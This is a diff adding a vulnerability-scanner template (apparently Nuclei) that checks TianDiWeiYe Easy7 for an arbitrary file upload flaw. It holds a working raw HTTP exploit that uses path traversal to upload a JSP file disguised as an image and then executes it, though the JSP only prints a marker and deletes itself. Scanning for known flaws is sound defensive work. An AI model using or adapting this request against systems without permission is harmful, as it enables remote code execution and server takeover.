@@ -1,0 +1,47 @@
+id: TianDiWeiYe-Easy7-uploadMapServerBgImage-File-Upload
+
+info:
+  name: 天地伟业Easy7 uploadMapServerBgImage 任意文件上传漏洞
+  author: HuanXiong
+  severity: critical
+  description: |
+    天地伟业Easy7系统的uploadMapServerBgImage接口存在任意文件上传漏洞，攻击者可通过构造恶意的Multipart请求上传JSP恶意文件，进而执行任意代码，导致服务器被控制、敏感数据泄露等严重后果。
+  reference:
+    - 
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" 
+
+http:
+  - raw:
+      - |
+        POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="uploadParams";
+
+        [{"path":"../Easy7/","name":"{{username}}.jsp"}]
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+      - |
+        GET /Easy7/{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
